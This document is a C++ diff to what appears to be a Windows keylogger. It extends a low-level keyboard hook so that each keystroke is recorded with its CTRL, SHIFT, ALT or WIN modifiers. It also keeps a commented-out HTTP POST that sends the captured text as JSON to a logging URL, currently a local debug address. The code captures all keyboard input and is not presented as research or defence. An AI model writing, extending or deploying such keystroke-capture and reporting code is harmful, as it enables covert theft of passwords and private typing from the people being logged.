@@ -10,12 +10,33 @@ const char* DEBUG_URL = "http://127.0.0.1:8000/log";
 LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
     auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
 
+    auto checkModifierStatus = [](int vkCode) {
+        return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
+    };
+
     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
         char c = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);
 
-        if (scanCodeMapFI.find(kbStruct->scanCode) != scanCodeMapFI.end()) {
-            printf("%d / %s\n",kbStruct->scanCode, scanCodeMapFI[kbStruct->scanCode].c_str());
+        std::string final;
+
+        if (checkModifierStatus(VK_CONTROL)) {
+            final += "CTRL + ";
         }
+        if (checkModifierStatus(VK_SHIFT)) {
+            final += "SHIFT + ";
+        }
+        if (checkModifierStatus(VK_MENU)) {
+            final += "ALT + ";
+        }
+        if (checkModifierStatus(VK_LWIN) || checkModifierStatus(VK_RWIN)) {
+            final += "WIN + ";
+        }
+
+        if (scanCodeMapFI.find(kbStruct->scanCode) != scanCodeMapFI.end()) {
+            final += scanCodeMapFI[kbStruct->scanCode];
+        }
+
+        printf("%s\n", final.c_str());
 
         //const cpr::Response r = cpr::Post(cpr::Url{DEBUG_URL}, cpr::Header{{"Content-Type", "application/json"}},
        // cpr::Body{"{\"text\": \"" + body + "\"}"});
@@ -38,3 +59,4 @@ int main() {
 
     return 0;
 }
+
